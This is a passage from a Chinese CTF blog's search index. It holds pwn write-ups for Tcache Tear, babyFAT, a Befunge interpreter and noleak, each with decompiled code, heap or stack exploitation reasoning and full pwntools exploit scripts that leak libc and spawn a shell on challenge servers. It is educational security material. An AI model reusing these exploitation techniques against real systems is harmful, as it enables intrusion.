-libc.sym['_IO_2_1_stdout_'] info(\"libc: \"+hex(libc.address)) sh.sendlineafter('choice: ','1') sh.recvuntil(\":\") sh.sendline('a'+'\\x00') sh.recvuntil(\":\") sh.send('a'*15+'\\x00') sh.recvuntil(\"Data:\") sh.send(p64(libc.sym['system'])) # gdb.attach(p) sh.sendlineafter('choice: ','3') sh.recvuntil(\"Index:\") sh.sendline(\"/bin/sh\\x00\") sh.interactive() 由于延迟原因（辣鸡校园网，建议使用sh.recvuntil('xxx');sh.send('xxx')而不是sendlineafter。 ","date":"2021-05-07","objectID":"/challenges-100-week-10/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#exp-2"},{"categories":["Writeups"],"content":"pwnable.tw-Tcache Tear","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#pwnabletw-tcache-tear"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled ","date":"2021-05-07","objectID":"/challenges-100-week-10/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#checksec-3"},{"categories":["Writeups"],"content":"IDAadd int add() { unsigned __int64 v0; // rax int size; // [rsp+8h] [rbp-8h] printf(\"Size:\"); v0 = choice(); size = v0; if ( v0 \u003c= 0xFF ) { ptr = malloc(v0); printf(\"Data:\"); my_read((__int64)ptr, size - 16); LODWORD(v0) = puts(\"Done !\"); } return v0; } main void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { __int64 v3; // rax unsigned int v4; // [rsp+Ch] [rbp-4h] Init(a1, a2, a3); printf(\"Name:\"); my_read(\u0026name, 32LL); v4 = 0; while ( 1 ) { while ( 1 ) { menu(); v3 = choice(); if ( v3 != 2 ) break; if ( v4 \u003c= 7 ) { free(ptr); ++v4; } } if ( v3 \u003e 2 ) { if ( v3 == 3 ) { show(); } else { if ( v3 == 4 ) exit(0); LABEL_14: puts(\"Invalid choice\"); } } else { if ( v3 != 1 ) goto LABEL_14; add(); } } } show ssize_t show() { printf(\"Name :\"); return write(1, \u0026name, 0x20uLL); } 漏洞点有两个地方: free后指针未清零，对本题来说可以造成UAF 在add函数中，若size\u003c16，则会整数溢出，可写入任意长度数据 got表不可写，同时也没有输出函数，只有将名字进行输出。首先，想办法进行leak，通过uaf，我们可以对任意已知地址的内存进行读写，所以我们将name所在的内存伪造成一个large chunk，将其free，再show就可以leak libc，之后就是简单了。 为了成功将large chunk进行free，我们需要构造三个chunk，看下面的这段代码： nextsize = chunksize(nextchunk); if (__builtin_expect (chunksize_nomask (nextchunk) \u003c= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize \u003e= av-\u003esystem_mem, 0)) malloc_printerr (\"free(): invalid next size (normal)\"); ··· if (nextchunk != av-\u003etop) { /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); 该段代码检查free的chunk的nextchunk大小是否满足要求，还检查了nextchunk的inuse位，这一位在nextchunk的nextchunk中，所以我们要伪造三个chunk。 首先，先将两个nextchunk构造出来，在name+0x500的地方伪造通过任意地址读写伪造两个0x20的chunk，之后在将name的chunk取出free掉。 ","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#ida-3"},{"categories":["Writeups"],"content":"exp from pwn import * # from LibcSearcher import LibcSearcher from struct import pack import sys leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.arch=\"amd64\" context.terminal = ['tmux', 'splitw', '-h'] binary='./tcache_tear' #gdb.attach(sh) if 'g' in sys.argv[1]: context.log_level=\"DEBUG\" if 'l' in sys.argv[1] and 'r' not in sys.argv[1]: log.info('Test in local...') sh=process(binary) if 'r' in sys.argv[1]: log.info('Attacking...') sh=remote('chall.pwnable.tw', 10207) elf = ELF(binary,checksec=False) libc = ELF('./libc.so',checksec=False) def add(size,data): sh.recvuntil('choice :') sh.sendline('1') sh.recvuntil('Size:') sh.send(str(size)) sh.recvuntil('Data:') sh.send(data) def free(): sh.recvuntil('choice :') sh.sendline('2') name = 0x602060 one = [0x4f2c5, 0x4f322,0x10a38c] sh.sendline(p64(0)+p64(0x501)) add(0x50,'a'*8+'\\n') # 0x100 free() free() add(0x50,p64(name+0x500)) add(0x50,'aaa') add(0x50,p64(0)+p64(0x21)+p64(0)*3+p64(0x21)+p64(0)*2) add(0x60,'aaaa') free() free() add(0x60,p64(name+0x10)) add(0x60,'aaa') add(0x60,'a') free() # gdb.attach(sh) sh.recvuntil('choice :') sh.sendline('3') malloc_hook = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 96 - 0x10 libc.address = malloc_hook - libc.sym['__malloc_hook'] one_gadget = libc.address + one[1] leak('libc base',libc.address) add(0x70,'aaaa') free() free() add(0x70,p64(libc.sym['__free_hook'])) add(0x70,'aaa') add(0x70,p64(one_gadget)) free() sh.interactive() ","date":"2021-05-07","objectID":"/challenges-100-week-10/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#exp-3"},{"categories":["Writeups"],"content":"Lilac 2021 五一欢乐赛假期没人约，没事干又不想写作业只能a题了，去年十一的时候第一次做Lilac的题，5天做出一道（太菜了。这次把题AK了，很开心 ","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#lilac-2021-五一欢乐赛"},{"categories":["Writeups"],"content":"babyFAT","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#babyfat"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-05-07","objectID":"/challenges-100-week-10/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#checksec-4"},{"categories":["Writeups"],"content":"IDA int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [rsp+7h] [rbp-109h] BYREF int v5; // [rsp+8h] [rbp-108h] int v6; // [rsp+Ch] [rbp-104h] int v7; // [rsp+10h] [rbp-100h] int v8; // [rsp+14h] [rbp-FCh] int i; // [rsp+18h] [rbp-F8h] int v10; // [rsp+1Ch] [rbp-F4h] char nptr[16]; // [rsp+20h] [rbp-F0h] BYREF char FAT[112]; // [rsp+30h] [rbp-E0h] BYREF char string[104]; // [rsp+A0h] [rbp-70h] BYREF unsigned __int64 v14; // [rsp+108h] [rbp-8h] v14 = __readfsqword(0x28u); v6 = 0; v7 = v5; v10 = 0; setbuf(stdout, 0LL); setbuf(stdin, 0LL); setbuf(stderr, 0LL); hello(); do { print_menu(); __isoc99_scanf(\" %c\", \u0026v4); if ( v4 == 50 ) { for ( i = v5; ; i = FAT[i] ) { putchar(string[i]); if ( i == v7 ) break; } puts(\u0026byte_400DD8); } else if ( v4 \u003e 50 ) { if ( v4 == 51 ) { printf(\"Index: \"); __isoc99_scanf(\"%s\", nptr); v10 = atoi(nptr); if ( v6 ) { for ( i = v5; ; i = FAT[i] ) { if ( i == v10 ) { printf(\"Input content: \"); __isoc99_scanf(\" %c\", \u0026string[v10]); puts(\"Success\"); goto LABEL_27; } if ( i == v7 ) break; } puts(\"Wrong idx!\"); } } else if ( v4 == 52 ) { v6 = 0; memset(FAT, 0, 0x64uLL); memset(string, 0, 0x64uLL); puts(\"Success\"); } } else if ( v4 == 49 ) { if ( v6 \u003c= 99 ) { printf(\"Index: \"); __isoc99_scanf(\"%s\", nptr); v10 = (int)abs32(atoi(nptr)) % 100; printf(\"Input content: \"); if ( v6 ) FAT[v8] = v10; else v5 = v10; v8 = v10; ++v6; v7 = v10; __isoc99_scanf(\" %c\", \u0026string[v10]); } else { puts(\"full!\"); } } LABEL_27: ; } while ( v4 != 53 ); puts(\"Bye~\"); return 0; } 开启了canary保护，还有一个后门。在write和edit的时候使用的__isoc99_scanf(\"%s\", nptr);会造成任意长度溢出，但是并不知道canary的值。程序本身是一个File Allocation Table，通过FAT[]数组寻找下一个字符的下标，例如FAT[1] = 12那么1之后就要去找12。这里有一个很棒的视频。 我们可以通过溢出覆盖FAT[0]的值为一个较大的数，造成数组超界。我们可以通过这个来leak canary。 ","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#ida-4"},{"categories":["Writeups"],"content":"exp from pwn import * context.log_level=\"DEBUG\" p = remote(\"101.200.201.114\",30001) def write(idx,content): p.sendlineafter('choice: ','1') p.sendlineafter('Index: ',str(idx)) p.sendline(str(content)) def show(): p.sendlineafter('choice: ','2') def edit(idx,content): p.sendlineafter('choice: ','3') p.sendlineafter('Index: ',str(idx)) p.sendline(str(content)) ## xx xx xx xx xx xx xx 00 ## +6 +5 +4 +3 +2 +1 +0 write(0,'a') write(1,'a') payload = p32(0)*4+p8(0x69)+'\\x01'*111 edit(payload,'a') show() p.recvuntil('a') bit_1 = u8(p.recv(1)) print(hex(bit_1)) payload = p32(0)*4+p8(0x69+1)+'\\x01'*111 edit(payload,'a') show() p.recvuntil('a') bit_2 = u8(p.recv(1)) print(hex(bit_2)) payload = p32(0)*4+p8(0x69+2)+'\\x01'*111 edit(payload,'a') show() p.recvuntil('a') bit_3 = u8(p.recv(1)) print(hex(bit_3)) payload = p32(0)*4+p8(0x69+3)+'\\x01'*111 edit(payload,'a') show() p.recvuntil('a') bit_4 = u8(p.recv(1)) print(hex(bit_4)) payload = p32(0)*4+p8(0x69+4)+'\\x01'*111 edit(payload,'a') show() p.recvuntil('a') bit_5 = u8(p.recv(1)) print(hex(bit_5)) payload = p32(0)*4+p8(0x69+5)+'\\x01'*111 edit(payload,'a') show() p.recvuntil('a') bit_6 = u8(p.recv(1)) print(hex(bit_6)) payload = p32(0)*4+p8(0x69+6)+'\\x01'*111 edit(payload,'a') show() p.recvuntil('a') bit_7 = u8(p.recv(1)) print(hex(bit_7)) canary = +p8(0)+p8(bit_1)+p8(bit_2)+p8(bit_3)+p8(bit_4)+p8(bit_5)+p8(bit_6)+p8(bit_7) payload = \"\\x00\"*(0xf0-8)+canary+p64(0)+p64(0x04008E7) write(payload,'a') #gdb.attach(p) p.sendlineafter('choice: ','5') p.interactive() ","date":"2021-05-07","objectID":"/challenges-100-week-10/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#exp-4"},{"categories":["Writeups"],"content":"befunge","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#befunge"},{"categories":["Writeups"],"content":"checksc Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled ","date":"2021-05-07","objectID":"/challenges-100-week-10/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#checksc"},{"categories":["Writeups"],"content":"IDA __int64 __fastcall main(int a1, char **a2, char **a3) { char *v3; // rbp unsigned __int64 v4; // rcx __int64 i; // rax char v6; // di char v7; // dl __int64 v8; // rdi int v9; // eax __int64 v10; // r14 __int64 v11; // rdi __int64 v12; // r14 __int64 v13; // rdi __int64 v14; // r14 __int64 v15; // rdi __int64 v16; // r14 __int64 v17; // rdi __int64 v18; // r14 __int64 v19; // rdi __int64 v20; // r14 __int64 v21; // rax __int64 v22; // rax __int64 v23; // r14 __int64 v24; // r15 __int64 v25; // r14 __int64 v26; // r14 __int64 v27; // rax __int64 v28; // r15 __int64 v29; // r14 int v30; // eax int step; // ebx int v33; // [rsp+Ch] [rbp-9Ch] BYREF char s[80]; // [rsp+10h] [rbp-98h] BYREF __int16 v35; // [rsp+60h] [rbp-48h] unsigned __int64 v36; // [rsp+68h] [rbp-40h] v36 = __readfsqword(0x28u); alarm(0x28u); __sysv_signal(14, handler); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); puts(\"Welcome to Online Befunge(93) Interpreter\"); puts(\"Please input your program.\"); v3 = program; do { __printf_chk(1LL, \"\u003e \"); memset(s, 0, sizeof(s)); v35 = 0; if ( !fgets(s, 82, stdin) ) break; if ( s[0] ) { v4 = strlen(s) + 1; if ( *((_BYTE *)\u0026v33 + v4 + 2) == 10 ) *((_BYTE *)\u0026v33 + v4 + 2) = 0; } for ( i = 0LL; i != 80; ++i ) v3[i] = s[i]; v3 += 80; } while ( v3 != \u0026program[2000] ); step = 10001; do { if ( string_mode ) { v6 = program[80 * y_offset + x_offset]; if ( v6 == 34 ) string_mode = 0; else push(v6); } else if ( bridge \u003c= 0 ) { v7 = program[80 * y_offset + x_offset]; switch ( v7 ) { case ' ': break; case '!': v22 = pop(); push(v22 == 0); break; case '\"': string_mode = 1; break; case '#': bridge = 1; break; case '$': pop(); break; case '%': v18 = pop(); v19 = pop() % v18; push(v19); break; case '\u0026': __isoc99_scanf(\"%d\", \u0026v33); push(v33); break; case '*': v14 = pop(); v15 = v14 * pop(); push(v15); break; case '+': v10 = pop(); v11 = pop() + v10; push(v11); break; case ',': v9 = pop(); _IO_putc(v9, stdout); break; case '-': v12 = pop(); v13 = pop() - v12; push(v13); break; case '.': pop(); __printf_chk(1LL, \u0026off_12F0); break; case '/': v16 = pop(); v17 = pop() / v16; push(v17); break; case ':': v23 = pop(); push(v23); push(v23); break; case '\u003c': move = 2; break; case '\u003e': move = 0; break; case '@': puts(\"\\n\"); puts(\"Program exited\"); exit(0); case '\\\\': v24 = pop(); v25 = pop(); push(v24); push(v25); break; case '^': move = 3; break; case '_': move = pop() != 0 ? 2 : 0; break; case '`': v20 = pop(); v21 = pop(); push(v21 \u003e v20); break; case 'g': v26 = pop(); v27 = pop(); push(program[80 * v26 + v27]); break; case 'p': v28 = pop(); v29 = pop(); program[80 * v28 + v29] = pop(); break; case 'v': move = 1; break; case '|': move = pop() == 0 ? 1 : 3; break; case '~': v8 = _IO_getc(stdin); push(v8); break; default: if ( (unsigned __int8)(v7 - 48) \u003c= 9u ) push(v7 - 48); break; } } else { --bridge; } y_offset += dword_14E0[move]; v30 = x_offset + dword_14F0[move]; x_offset = v30; if ( y_offset == -1 ) { y_offset = 24; } else if ( y_offset == 25 ) { y_offset = 0; } if ( v30 == -1 ) { x_offset = 79; } else if ( x_offset == 80 ) { x_offset = 0; } --step; } while ( step ); puts(\"Too many steps. Is there any infinite loops?\"); return 0LL; } 程序是一个befunge-93的解释器，befunge的程序布局是一个二维的平面，如下： Befunge-93 ========== 0 x 79 0+-------------+ | | y| | | 24+ ","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#ida-5"},{"categories":["Writeups"],"content":"Befunge-93 instruction list 0-9 Push this number on the stack + Addition: Pop a and b, then push a+b - Subtraction: Pop a and b, then push b-a * Multiplication: Pop a and b, then push a*b / Integer division: Pop a and b, then push b/a, rounded towards 0. % Modulo: Pop a and b, then push the remainder of the integer division of b/a. ! Logical NOT: Pop a value. If the value is zero, push 1; otherwise, push zero. ``` Greater than: Pop a and b, then push 1 if b\u003ea, otherwise zero. \u003e Start moving right \u003c Start moving left ^ Start moving up v Start moving down ? Start moving in a random cardinal direction _ Pop a value; move right if value=0, left otherwise ` ` \" Start string mode: push each character’s ASCII value all the way up to the next \" : Duplicate value on top of the stack \\ Swap two values on top of the stack $ Pop value from the stack and discard it . Pop value and output as an integer followed by a space , Pop value and output as ASCII character # Bridge: Skip next cell p A “put” call (a way to store a value for later use). Pop y, x, and v, then change the character at (x,y) in the program to the character with ASCII value v g A “get” call (a way to retrieve data in storage). Pop y and x, then push ASCII value of the character at that position in the program \u0026 Ask user for a number and push it ~ Ask user for a character and push its ASCII value @ End program (space) No-op. Does nothing 利用\u0026，g和,的功能，我们有办法做到任意读。 先通过\u0026将x跟ypush到Stack上，x与y我们可控（32位整数） 这边注意stack是程序在bss段自行模拟出来的一块，拥有类似的堆栈行为，并不是指程式真正的堆栈。 g的功能是将program[80 * x + y]的内容push到Stack上。因为x与y我们可控，代表着我们可以将任意位址的内容push到Stack上。 , 弹出stack顶端的值（可控）pop出来（1 byte），并印出他的数值。 利用\u0026和p的功能，我们还有办法做到任意写 先穿透\u0026将x，y与zpush到stack上 p功能会先从堆栈弹出出3个值（x，y，z，均可控），之后将ž的值放入program[80 * x + y]（即program[80 * x + y] = z）。 还有一点要注意 因为通过\u0026功能将数值push进栈时，一次只能push一个整数（32位）。如果我们想要使program[80 * x + y]跳到很远的地方，x与y很有可能会需要是一个超过integer范围的数值，如此一来使用\u0026功能将无法满足我们的需求。 解决方法，利用的*功能。*会从堆栈弹出顶端两个出数值x与y，并将x * y的查询查询结果推回栈上。这里全程是使用64位寄存器进行操作，所以不会有整数32位的问题。 因此，先通过*功能将stack顶端变成一个长整数，之后我们就可以利用上面的方法对任意位址做任意读写。 got表不可写，我们只能覆盖栈上的返回地址来执行shell。另外，我们还要泄露libc的值。 通过任意地址读，我们将got表中某函数的地址leak从而得到libc的基址，接下来，我们通过leak栈地址来覆盖返回地址，参考博客，leak栈地址有以下几种方法(繁体就不翻译了，看多了就习惯了)： leak stack 上的 saved rbp 或是 argv。这部分通常是用在 format string 的漏洞，這題無法這樣做。 leak tls section 上的 stack address。這部份比較進階，簡單來說就是程式在執行的時候，會有個 memory 的區塊叫做 tls section，裡面會存許多有用的東西，像是 stack canary, main_arena 的 address, 以及一個不知道指向哪裡的 stack address。而要透過這種方式 leak stack address，我們必須要有辦法知道 tls section 的位址，而這通常需要透過程式先呼叫 mmap，之後 leak mmap 出來的 memory address 來達成。這題因為沒有 malloc 或是 mmap，所以也無法透過這樣的方式來 leak stack address。 leak ld-linux.so 的 __libc_stack_end symbol。如果我們有辦法知道 ld-linux.so 的位址以及版本，我們可以透過 leak 裡面的 __libc_stack_end 這個 symbol，來獲取 stack address。這題用這種方式理論上辦的到，我自己就是用這種方式 leak 的，只是做起來非常麻煩。解完這題之後，經詢問別人才發現原來還有第四種方式。 leak libc 里面的 environ symbol。 libc 裡面有個 symbol 叫做 environ，裡面會存 stack address。因此這題比較漂亮的方式，是 leak libc 的 address 之後，直接 leak libc.symbols['environ'] 來獲取 stack address。 我采用了最后一种方式，博客原文采用了第三种绕了一大圈。另外，这题似乎是MMA CTF 2nd 2016的Interpreter 200并非原创题。 ","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:1","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#befunge-93-instruction-listhttpsenwikipediaorgwikibefunge"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack import sys leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.arch=\"amd64\" context.terminal = ['tmux', 'splitw', '-h'] binary='./befunge' #gdb.attach(sh) if 'g' in sys.argv[1]: context.log_level=\"DEBUG\" if 'l' in sys.argv[1] and 'r' not in sys.argv[1]: sh=process(binary) if 'r' in sys.argv[1]: sh=remote('101.200.201.114', 30002) elf = ELF(binary,checksec=False) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False) def cal_offset(addr, text_base): start_from = text_base + 0x202040 offset = addr - start_from off_80 = offset/80 off_1 = offset%80 return off_1, off_80 def write(addr, text_base, value): cnt = 0 off_1, off_80 = cal_offset(addr, text_base) temp = int(math.sqrt(off_80)) off_1 = (off_80 - temp**2)*80 + off_1 for i in range(off_1, off_1+6): v = (value\u003e\u003e(8*cnt)) \u0026 0xff sh.sendline(str(v)) sh.sendline(str(i)) sh.sendline(str(temp)) sh.sendline(str(temp)) cnt += 1 base = 0x202040 program = '\u003e'.ljust(79,' ')+'v'+'\\n' program+= 'v,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026,g\u0026\u0026'.ljust(79,' ')+'\u003c'+'\\n' #leak libc 6bytes (1st: -2, 2nd: -48 ~ -43) #leak text 6bytes-56, -9 program+= '\u003e\u0026\u0026\u0026*g,\u0026\u0026\u0026*g,\u0026\u0026\u0026*g,\u0026\u0026\u0026*g,\u0026\u0026\u0026*g,\u0026\u0026\u0026*g,'.ljust(79,' ')+'v'+'\\n' #leak text 6bytes-56, -9 program+= 'vp*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026'.ljust(79,' ')+'\u003c'+'\\n' program+= '\u003e\u0026\u0026\u0026\u0026*p\u0026\u0026\u0026\u0026*p\u0026\u0026\u0026\u0026*p\u0026\u0026\u0026\u0026*p\u0026\u0026\u0026\u0026*p\u0026\u0026\u0026\u0026*p'.ljust(79,' ')+'v'+'\\n' program+= 'vp*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026p*\u0026\u0026\u0026\u0026'.ljust(79,' ')+'\u003c'+'\\n' program+= ('v'.ljust(79,' ')+'\u003c'+'\\n')*17 program+= '\u003e'.ljust(79,'\u003e')+'v'+'\\n' program+= '^'.ljust(79,'\u003c')+'\u003c'+'\\n' sh.sendlineafter('\u003e',program) sh.recvuntil(\"\u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \") libc_leak = '' for i in range(6): sh.sendline(str((-48)+i)) sh.sendline(str(-2)) rev = u8(sh.recv(1)) libc_leak = libc_leak+p8(rev) leak(str(i),rev) libc_leak = u64(libc_leak.ljust(8,'\\x00')) libcbase = libc_leak-libc.sym['__libc_start_main'] system = libcbase + libc.sym[\"system\"] env = libcbase + libc.sym['environ'] binsh = libcbase+ libc.search('/bin/sh').next() leak('libc base',libcbase) leak('binsh',binsh) text_leak = '' for i in range(6): sh.sendline(str((-56)+i)) sh.sendline(str(-9)) rev = u8(sh.recv(1)) text_leak = text_leak+p8(rev) leak(str(i),rev) textbase = u64(text_leak.ljust(8,'\\x00'))-0xb00 pop_rdi = textbase + 0x120c start = base+textbase leak('text base',textbase) leak('pop rdi',pop_rdi) off_1, off_80 = cal_offset(env, textbase) temp = int(math.sqrt(off_80)) off_1 = (off_80 - temp**2)*80 + off_1 stack_leak = '' for i in range(off_1,off_1+6): sh.sendline(str(i)) sh.sendline(str(temp)) sh.sendline(str(temp)) rev = u8(sh.recv(1)) stack_leak = stack_leak+p8(rev) leak(str(i-off_1),rev) stack_leak = u64(stack_leak.ljust(8,'\\x00'))-0xf0 leak('stack_leak',stack_leak) write(stack_leak, textbase, pop_rdi) write(stack_leak+8, textbase, binsh) write(stack_leak+16, textbase, system) sh.interactive() ","date":"2021-05-07","objectID":"/challenges-100-week-10/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#exp-5"},{"categories":["Writeups"],"content":"noleak","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#noleak"},{"categories":["Writeups"],"content":"check Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-05-07","objectID":"/challenges-100-week-10/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#check"},{"categories":["Writeups"],"content":"IDAadd __int64 add() { __int64 result; // rax int v1; // [rsp+0h] [rbp-10h] int nbytes; // [rsp+4h] [rbp-Ch] void *nbytes_4; // [rsp+8h] [rbp-8h] puts(\"Input index:\"); v1 = sub_9E0(); puts(\"Input size:\"); nbytes = sub_9E0(); if ( v1 \u003c 0 || v1 \u003e 10 || nbytes \u003c 0 || nbytes \u003e 496 ) { puts(\"index or size invalid!\"); result = 0xFFFFFFFFLL; } else { nbytes_4 = malloc(nbytes); puts(\"Input data:\"); read(0, nbytes_4, (unsigned int)nbytes); *((_QWORD *)\u0026unk_2020C0 + 2 * v1) = nbytes_4; dword_2020C8[4 * v1] = nbytes; result = 0LL; } return result; } dele __int64 dele() { __int64 result; // rax int v1; // [rsp+Ch] [rbp-4h] puts(\"Input index:\"); v1 = sub_9E0(); if ( v1 \u003e= 0 \u0026\u0026 v1 \u003c= 10 \u0026\u0026 *((_QWORD *)\u0026unk_2020C0 + 2 * v1) ) { free(*((void **)\u0026unk_2020C0 + 2 * v1)); *((_QWORD *)\u0026unk_2020C0 + 2 * v1) = 0LL; dword_2020C8[4 * v1] = 0; result = 0LL; } else { puts(\"Index invalid!\"); result = 0xFFFFFFFFLL; } return result; } edit __int64 edit() { __int64 result; // rax int v1; // [rsp+Ch] [rbp-4h] puts(\"Input index:\"); v1 = sub_9E0(); if ( v1 \u003e= 0 \u0026\u0026 v1 \u003c= 10 \u0026\u0026 *((_QWORD *)\u0026unk_2020C0 + 2 * v1) ) { puts(\"Input data:\"); sub_A34(*((_QWORD *)\u0026unk_2020C0 + 2 * v1), (unsigned int)dword_2020C8[4 * v1]); result = 0LL; } else { puts(\"Index invalid!\"); result = 0xFFFFFFFFLL; } return result; } 远程环境为16.04漏洞点在edit有off-by-one，但是要回车跳出循环或者将size+1的空间全部填满。 思路还是很简单的，使用house of roman来申请ioleak libc。然后使用fastbin attack覆写__malloc_hook。 难点在堆的布局， 首先，申请五个chunk，chunk_3是fastbin victim大小为0x70，在这个chunk尾部伪造一个0x20大小的chunk，用以后面进行分割，并将其释放掉。 再通过off-by-onechunk_0伪造一个unsorted chunk = chunk_1 + chunk_2 + chunk_3，这个chunk要包含fastbin victim。 editchunk_1将chunk_2的大小设为0x61，free(unsorted chunk)，这时再malloc(0x130)，unsorted chunk就会被分割，unsorted bin中只留下了chunk_3，而chunk_3在开始被加入了fastbin中。 free(chunk_2)，chunk_2被我们修改了大小，其尾部包含了chunk_3的头部，所以我们可以覆写其fd的低字节使其指向io_file就可以leak libc。 之后就简单的fastbin attack了。 ","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#ida-6"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack import sys leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.arch=\"amd64\" context.terminal = ['tmux', 'splitw', '-h'] context.log_level=\"DEBUG\" binary='./pwn' #gdb.attach(sh) elf = ELF(binary,checksec=False) def add(idx, size, content): sh.sendlineafter('choice:', '1') sh.sendlineafter('index:', str(idx)) sh.sendlineafter('size:', str(size)) sh.sendafter('data:', str(content)) def edit(idx, content): sh.sendlineafter('choice:', '3') sh.sendlineafter('index:', str(idx)) sh.sendafter('data:', str(content)) def delete(idx): sh.sendlineafter('choice:', '2') sh.sendlineafter('index:', str(idx)) for i in range(0x100): try: sh = process('./pwn') # sh = remote(\"101.200.201.114\", 30003) add(0, 0xf8, 'a'*8) add(1, 0xf8, 'a'*8) add(2, 0x30, 'a'*8) add(3, 0x60, ('a'*8).ljust(0x18, '\\x00') + p64(0x21)) add(4, 0x100, 'a'*8) add(5, 0x68, 'a'*8) add(6, 0x30, 'a'*8) add(7, 0x60, ('a'*8).ljust(0x18, '\\x00') + p64(0x21)) add(8, 0x60, 'a'*8) delete(3) edit(0, p64(0) * (0xf8 / 8) + '\\xb1') edit(1, 'a' * 0xf0 + p64(0) + p64(0x61)) delete(1) add(1, 0x130, 'a'*8) delete(2) add(2, 0x50, 'a' * 0x30 + p64(0) + p64(0x71) + '\\xdd\\x25') add(3, 0x60, 'a'*8) add(4, 0x60, 'A'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\\x00') libc = u64(sh.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - 0x3c5600 leak('libc leak',libc) delete(7) edit(5, 'a' * 0x60 + p64(0) + '\\x61') delete(6) add(6, 0x50, 'a' * 0x30 + p64(0) + p64(0x71) + p64(libc + 0x3c4aed)) add(7, 0x60, 'a'*8) realloc = libc + 0x84710 payload = 'a' * 0xb + p64(libc + 0x4527a) + p64(realloc + 6) add(7, 0x60, payload) leak('realloc',realloc) sh.interactive() except : pass ","date":"2021-05-07","objectID":"/challenges-100-week-10/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#exp-6"},{"categories":["Writeups"],"content":"Challenges_100-Week_9 Challenges Tricks NahamconCTF-2021-meddle UAF+tcache_poisoning NahamconCTF-2021-rps stackoverflow+fmt V\u0026NCTF2021-PWN-White_Give_Flag force bypass angstromctf-2021-Secure Login force bypass angstromctf-2021-RAIId Shadow Legends 覆写未初始化变量地址 ","date":"2021-04-18","objectID":"/challenges-100-week-9/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 9","uri":"/challenges-100-week-9/#challenges_100-week_9"},{"categories":["Writeups"],"content":"meddleps:test in local environment ","date":"2021-04-18","objectID":"/challenges-100-week-9/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 